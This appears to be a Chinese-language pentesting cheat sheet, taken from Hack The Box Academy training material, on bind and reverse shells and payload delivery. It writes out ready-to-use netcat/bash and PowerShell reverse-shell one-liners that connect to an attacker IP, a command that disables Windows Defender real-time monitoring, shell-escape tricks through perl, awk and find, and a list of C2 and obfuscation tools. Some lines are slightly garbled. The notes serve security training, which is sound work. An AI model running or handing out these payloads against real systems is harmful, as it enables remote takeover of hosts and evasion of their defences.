# Payloads

## 一、SHELL 基础

### 1. 绑定 SHELL

> 使用绑定 SHELL ，目标系统会启动一个侦听器并等待攻击机的连接

![](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

```shell
# 目标系统--将 Bash shell 绑定到 TCP 会话
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.59.215 7777 > /tmp/f

# 攻击机
nc -nv 10.129.59.215 7777
```

### 2. Reverse shell

> 使用 Reverse shell , 攻击框将运行一个侦听器，目标将需要启动连接 Reverse shell 在线生成器 --> [跳转链接](https://www.revshells.com/)

![](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)

```shell
# 攻击机
sudo nc -lvnp 443

# 目标系统 -- windows
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 二、Payloads

```shell
# Netcat/Bash 反向 Shell 
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# PowerShell 
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 三、Windows Shell

### 1. 枚举 Windows 和指纹识别

1. 使用 nmap 模块进行枚举
2. 不同的操作系统，ping 之后返回的 TTL 通常是不同的，我们可以利用这一个弱点进行利用 --> [不同的操作系统对应的 TTL](http://subinsb.com/default-device-ttl-values/#comment-3068871033)

### 2. Payload 类型

> 在为 Windows 创建有效负载时，我们可以使用下面几种类型

* DLL : 动态链接库 (DLL) 是 Microsoft 操作系统中使用的库文件
* bat : 批处理文件是系统管理员用来通过命令行解释器完成多项任务的基于文本的 DOS 脚本
* VBS : icrosoft Visual Basic 的轻量级脚本语言
* MSI : 用作 Windows Installer 的安装数据库
* Powershell : Powershell 既是shell 环境又是脚本语言

### 3. Payload 生成

| 资源                              | 描述                                                                                                                                                 |
| ------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| MSFVenom & Metasploit-Framework | [Source](https://github.com/rapid7/metasploit-framework) MSF 是一个非常通用的工具，适用于任何渗透测试人员的工具包。它用作枚举主机、生成有效负载、利用公共和自定义漏洞以及在主机上执行一次漏洞利用后操作的方法。把它想象成一把瑞士军刀。 |
| Payloads All The Things         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) 您可以找到许多不同的资源和备忘单，用于生成有效负载和一般方法。                                                      |
| Mythic C2 Framework             | [Source](https://github.com/its-a-feature/Mythic) Mythic C2 框架是 Metasploit 作为命令和控制框架和工具箱的替代选项，用于生成独特的有效负载。                                         |
| Nishang                         | [Soucre](https://github.com/samratashok/nishang) Nishang 是 Offensive PowerShell 植入程序和脚本的框架集合。它包括许多对任何渗透测试者都有用的实用程序。                                |
| Darkarmour                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour 是一种用于生成和利用混淆二进制文件以针对 Windows 主机的工具。                                                      |

### 4. Payload 传输和执行

* `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket)是一个内置于 Python 的工具集，它为我们提供了一种直接与网络协议交互的方式。我们在 Impacket 中关心的一些最令人兴奋的工具处理、、、Kerberos`psexec`以及支持 SMB 服务器的能力。`smbclient``wmi`
* \[Payloads All The Things]\(https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Download and Execute.md) : 是一个很好的资源，可以找到快速的 oneliners 以帮助方便地跨主机传输文件。
* `SMB`：SMB 可以提供一个易于利用的路径来在主机之间传输文件。当受害主机加入域并利用共享来托管数据时，这尤其有用。作为攻击者，我们可以使用这些 SMB 文件共享以及 C$ 和 admin$ 来托管和传输我们的有效负载，甚至可以通过链接泄露数据。
* `Remote execution via MSF`：Metasploit 中的许多漏洞利用模块中内置了一个函数，该函数将自动构建、暂存和执行有效负载。
* `Other Protocols`: 在查看主机时，FTP、TFTP、HTTP/S 等协议可以为您提供一种将文件上传到主机的方法。枚举并关注已开放并可供使用的功能。

## 四、生成交互式 SHELL

> [LOLBAS](https://lolbas-project.github.io/)

```shell
# Perl
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";

# Ruby
ruby: exec "/bin/sh"

# Lua
lua: os.execute('/bin/sh')

# AWK
awk 'BEGIN {system("/bin/sh")}'

# 使用 FInd shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# 使用 EXEC 启动 SHELL
find . -exec /bin/sh \; -quit

# 获取 sudo  权限
sudo -l
```
